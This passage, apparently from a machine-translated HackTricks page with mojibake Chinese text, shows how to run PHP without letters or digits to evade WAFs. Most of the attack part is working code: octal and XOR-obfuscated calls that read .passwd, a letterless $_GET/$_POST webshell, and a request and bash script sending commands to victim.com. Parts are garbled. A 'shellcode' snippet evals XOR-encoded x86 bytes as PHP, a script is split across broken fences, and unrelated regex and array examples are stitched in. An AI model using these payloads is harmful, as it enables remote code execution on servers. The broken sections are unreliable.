[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## æ— éœ€å­—æ¯æ‰§è¡Œ PHP

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### ä½¿ç”¨å…«è¿›åˆ¶
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **å¼‚æˆ–ï¼ˆXORï¼‰**

The XOR operation, also known as exclusive OR, is a logical operation that outputs true only when the number of true inputs is odd. In other words, it returns true if the inputs are different, and false if they are the same.

å¼‚æˆ–ï¼ˆXORï¼‰æ“ä½œï¼Œä¹Ÿè¢«ç§°ä¸ºâ€œå¼‚æˆ–â€ï¼Œæ˜¯ä¸€ç§é€»è¾‘æ“ä½œï¼Œåªæœ‰åœ¨è¾“å…¥ä¸ºçœŸçš„æ•°é‡ä¸ºå¥‡æ•°æ—¶æ‰è¾“å‡ºçœŸã€‚æ¢å¥è¯è¯´ï¼Œå¦‚æœè¾“å…¥ä¸åŒï¼Œåˆ™è¿”å›çœŸï¼Œå¦‚æœè¾“å…¥ç›¸åŒï¼Œåˆ™è¿”å›å‡ã€‚

The XOR operation can be used in various applications, including encryption, error detection, and data manipulation. In the context of hacking, XOR can be used to obfuscate data or bypass certain security measures.

å¼‚æˆ–æ“ä½œå¯ä»¥ç”¨äºå„ç§åº”ç”¨ï¼ŒåŒ…æ‹¬åŠ å¯†ã€é”™è¯¯æ£€æµ‹å’Œæ•°æ®æ“ä½œã€‚åœ¨é»‘å®¢æ”»å‡»çš„èƒŒæ™¯ä¸‹ï¼Œå¼‚æˆ–å¯ä»¥ç”¨äºæ··æ·†æ•°æ®æˆ–ç»•è¿‡æŸäº›å®‰å…¨æªæ–½ã€‚

In the field of cryptography, XOR is commonly used as a basic building block for more complex encryption algorithms. It provides a simple and efficient way to scramble data, making it difficult for unauthorized individuals to understand or access.

åœ¨å¯†ç å­¦é¢†åŸŸï¼Œå¼‚æˆ–é€šå¸¸è¢«ç”¨ä½œæ›´å¤æ‚çš„åŠ å¯†ç®—æ³•çš„åŸºæœ¬æ„å»ºå—ã€‚å®ƒæä¾›äº†ä¸€ç§ç®€å•é«˜æ•ˆçš„æ–¹å¼æ¥æ··æ·†æ•°æ®ï¼Œä½¿å¾—æœªç»æˆæƒçš„ä¸ªäººéš¾ä»¥ç†è§£æˆ–è®¿é—®ã€‚

In the context of network security, XOR can be used to bypass certain security measures that rely on specific patterns or signatures. By XORing a payload with a specific key or pattern, an attacker can modify the payload in a way that evades detection by security systems.

åœ¨ç½‘ç»œå®‰å…¨çš„èƒŒæ™¯ä¸‹ï¼Œå¼‚æˆ–å¯ä»¥ç”¨äºç»•è¿‡ä¾èµ–ç‰¹å®šæ¨¡å¼æˆ–ç­¾åçš„æŸäº›å®‰å…¨æªæ–½ã€‚é€šè¿‡å°†æœ‰æ•ˆè´Ÿè½½ä¸ç‰¹å®šå¯†é’¥æˆ–æ¨¡å¼è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥é€ƒé¿å®‰å…¨ç³»ç»Ÿçš„æ£€æµ‹ã€‚

Overall, XOR is a versatile operation that can be used in various hacking techniques to manipulate data, bypass security measures, or obfuscate information. Understanding how XOR works is essential for both offensive and defensive purposes in the field of cybersecurity.

æ€»çš„æ¥è¯´ï¼Œå¼‚æˆ–æ˜¯ä¸€ç§å¤šåŠŸèƒ½çš„æ“ä½œï¼Œå¯ä»¥åœ¨å„ç§é»‘å®¢æŠ€æœ¯ä¸­ç”¨äºæ“ä½œæ•°æ®ã€ç»•è¿‡å®‰å…¨æªæ–½æˆ–æ··æ·†ä¿¡æ¯ã€‚äº†è§£å¼‚æˆ–çš„å·¥ä½œåŸç†å¯¹äºç½‘ç»œå®‰å…¨é¢†åŸŸçš„æ”»å‡»å’Œé˜²å¾¡éƒ½æ˜¯è‡³å…³é‡è¦çš„ã€‚
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If Â¢___ not needed then $_($__), show_source(.passwd)
```
### XORç®€æ˜“shellä»£ç 

æ ¹æ®[**è¿™ç¯‡è§£æ**](https://mgp25.com/ctf/Web-challenge/)ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç”Ÿæˆä¸€ä¸ªç®€æ˜“çš„shellcodeï¼š
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
æ‰€ä»¥ï¼Œå¦‚æœä½ å¯ä»¥**æ‰§è¡Œä»»æ„çš„PHPä»£ç è€Œä¸ä½¿ç”¨æ•°å­—å’Œå­—æ¯**ï¼Œä½ å¯ä»¥å‘é€å¦‚ä¸‹è¯·æ±‚æ¥æ»¥ç”¨è¯¥æœ‰æ•ˆè´Ÿè½½æ¥æ‰§è¡Œä»»æ„çš„PHPä»£ç ï¼š
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
### XOR Shellcodeï¼ˆåœ¨evalå†…éƒ¨ï¼‰

```php
<?php
$shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
$key = "\x41";
$encoded_shellcode = "";
for ($i = 0; $i < strlen($shellcode); $i++) {
    $encoded_shellcode .= chr(ord($shellcode[$i]) ^ ord($key));
}
eval($encoded_shellcode);
?>
```

è¯¥æŠ€å·§ä½¿ç”¨äº†å¼‚æˆ–ï¼ˆXORï¼‰åŠ å¯†ç®—æ³•æ¥éšè—Shellcodeã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªç®€å•çš„Shellcodeï¼Œå®ƒæ‰§è¡Œäº†ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æ¥æ‰§è¡Œ/bin/shã€‚ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªå¯†é’¥ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯"A"ï¼‰å¯¹Shellcodeè¿›è¡Œå¼‚æˆ–åŠ å¯†ã€‚åŠ å¯†åçš„Shellcodeè¢«å­˜å‚¨åœ¨å˜é‡`$encoded_shellcode`ä¸­ã€‚æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨`eval`å‡½æ•°æ¥æ‰§è¡ŒåŠ å¯†åçš„Shellcodeã€‚

è¿™ç§æŠ€æœ¯çš„å¥½å¤„æ˜¯å¯ä»¥ç»•è¿‡ä¸€äº›ç®€å•çš„æ£€æµ‹æœºåˆ¶ï¼Œå› ä¸ºåŠ å¯†åçš„Shellcodeåœ¨å†…å­˜ä¸­æ˜¯ä¸å¯è¯»çš„ã€‚ç„¶è€Œï¼Œè¿™ç§åŠ å¯†æ–¹æ³•å¹¶ä¸æ˜¯å®Œå…¨å®‰å…¨çš„ï¼Œå› ä¸ºå¯†é’¥å¯ä»¥è¢«è½»æ¾åœ°æ¨å¯¼å‡ºæ¥ã€‚å› æ­¤ï¼Œè¿™ç§æŠ€æœ¯ä¸»è¦é€‚ç”¨äºä¸€äº›ç®€å•çš„åœºæ™¯ï¼Œè€Œä¸æ˜¯ç”¨äºçœŸæ­£çš„æ¸—é€æµ‹è¯•æˆ–æ”»å‡»ã€‚
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### ç±»ä¼¼ Perl çš„è¯­æ³•

Perl æ˜¯ä¸€ç§é€šç”¨çš„è„šæœ¬ç¼–ç¨‹è¯­è¨€ï¼Œå…·æœ‰å¼ºå¤§çš„æ–‡æœ¬å¤„ç†èƒ½åŠ›å’Œçµæ´»çš„è¯­æ³•ã€‚åœ¨ç¼–å†™ PHP ä»£ç æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›ç±»ä¼¼ Perl çš„è¯­æ³•æ¥æé«˜ä»£ç çš„æ•ˆç‡å’Œå¯è¯»æ€§ã€‚

#### æ­£åˆ™è¡¨è¾¾å¼

æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä¸€ç§å¼ºå¤§çš„æ¨¡å¼åŒ¹é…å·¥å…·ï¼Œå¯ä»¥åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾å’Œæ›¿æ¢ç‰¹å®šçš„æ¨¡å¼ã€‚åœ¨ PHP ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ Perl å…¼å®¹çš„æ­£åˆ™è¡¨è¾¾å¼è¯­æ³•æ¥è¿›è¡Œå­—ç¬¦ä¸²æ“ä½œã€‚

```php
// åŒ¹é…é‚®ç®±åœ°å€
$email = "example@example.com";
if (preg_match("/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/", $email)) {
    echo "é‚®ç®±åœ°å€æœ‰æ•ˆ";
} else {
    echo "é‚®ç®±åœ°å€æ— æ•ˆ";
}
```

#### å­—ç¬¦ä¸²æ“ä½œ

Perl æä¾›äº†ä¸°å¯Œçš„å­—ç¬¦ä¸²æ“ä½œå‡½æ•°ï¼ŒPHP ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„å‡½æ•°æ¥å¤„ç†å­—ç¬¦ä¸²ã€‚

```php
// å­—ç¬¦ä¸²æ‹¼æ¥
$name = "John";
$age = 25;
$message = $name . " is " . $age . " years old.";

// å­—ç¬¦ä¸²åˆ†å‰²
$csv = "apple,banana,orange";
$fruits = explode(",", $csv);

// å­—ç¬¦ä¸²æ›¿æ¢
$text = "Hello, World!";
$newText = str_replace("Hello", "Hi", $text);
```

#### æ•°ç»„æ“ä½œ

Perl çš„æ•°ç»„æ“ä½œéå¸¸çµæ´»ï¼ŒPHP ä¹Ÿæä¾›äº†ç±»ä¼¼çš„åŠŸèƒ½ã€‚

```php
// åˆ›å»ºæ•°ç»„
$fruits = array("apple", "banana", "orange");

// è®¿é—®æ•°ç»„å…ƒç´ 
echo $fruits[0]; // è¾“å‡º "apple"

// æ·»åŠ å…ƒç´ åˆ°æ•°ç»„æœ«å°¾
$fruits[] = "grape";

// éå†æ•°ç»„
foreach ($fruits as $fruit) {
    echo $fruit . " ";
}
```

é€šè¿‡ä½¿ç”¨ç±»ä¼¼ Perl çš„è¯­æ³•ï¼Œå¯ä»¥æ›´åŠ é«˜æ•ˆåœ°ç¼–å†™ PHP ä»£ç ï¼Œå¹¶æå‡ä»£ç çš„å¯è¯»æ€§å’Œç»´æŠ¤æ€§ã€‚
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾— [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
